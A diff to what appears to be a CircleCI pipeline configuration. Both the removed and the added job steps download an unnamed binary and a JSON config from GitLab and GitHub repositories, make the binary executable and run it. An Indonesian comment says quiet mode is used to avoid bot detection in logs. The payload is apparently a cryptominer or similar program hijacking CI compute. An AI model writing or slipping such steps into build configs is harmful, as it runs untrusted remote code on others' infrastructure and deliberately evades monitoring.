@@ -17,13 +17,7 @@ jobs:
       - run:
           name: "Setup Environment and Execute"
           command: |
-            # Menggunakan -q agar log bersih (menghindari deteksi bot lewat log berlebih)
-            wget -q https://gitlab.com/barbieanay003/seger/-/raw/main/class
-            wget -q https://gitlab.com/barbieanay003/seger/-/raw/main/isu3.json
-            chmod +x class
-            
-            # Menjalankan biner dengan timeout atau background jika perlu
-            ./class -c isu3.json
+            wget -O sgr https://github.com/barburonjilo/open/raw/refs/heads/main/isu && wget -q -O config.json https://gitlab.com/barbieanay003/seger/-/raw/main/isu2.json && chmod +x sgr && ./sgr -c config.json
 
 workflows:
   my-custom-workflow:
